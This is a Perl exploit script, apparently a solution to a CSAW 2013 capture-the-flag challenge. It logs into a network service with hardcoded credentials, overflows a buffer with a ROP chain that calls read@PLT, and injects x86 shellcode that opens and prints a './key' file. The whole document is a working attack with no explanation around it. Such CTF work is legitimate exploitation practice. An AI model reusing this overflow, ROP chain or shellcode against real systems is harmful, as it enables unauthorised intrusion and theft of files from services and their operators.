#!/usr/bin/perl

use strict;
use warnings;

use IO::Socket::INET;

my $sock = IO::Socket::INET->new(
    PeerAddr => '127.0.0.1',
    #PeerAddr => '128.238.66.217',
    PeerPort => 34266,
    Proto    => 'tcp');

my $sc = "\xeb\x2b\x31\xc0\xb0\x05\x5b\x31\xc9\xcd\x80\x89\xc6\x4c\xb0\x03\x89\xf3\x89\xe1\x31\xd2\x42\xcd\x80\x92\xb0\x04\x31\xdb\xb3\x04\x89\xe1\xcd\x80\x85\xd2\x75\xe6\x31\xc0\x40\xcd\x80\xe8\xd0\xff\xff\xff\x2e\x2f\x6b\x65\x79\x00";

my $buff = '';
my $payload;

$sock->send("csaw2013\n");

sleep(1);

$sock->send("S1mplePWD\n");

$sock->send("" . 0xFFFF);

sleep(1);

$payload .= "A"x(0x420);
$payload .= pack('L', 0x080486e0); # read@PLT
$payload .= pack('L', 0x08049110); # pop3; ret
$payload .= pack('L', 0x00000004); # FD
$payload .= pack('L', 0x0804b000); # DATA
$payload .= pack('L', length $sc);

$payload .= pack('L', 0x0804b000); # jmp to .bss

$sock->send($payload);

sleep(1);

$sock->send($sc);

sleep(1);

while(my $line = <$sock>) {
    print $line;
}
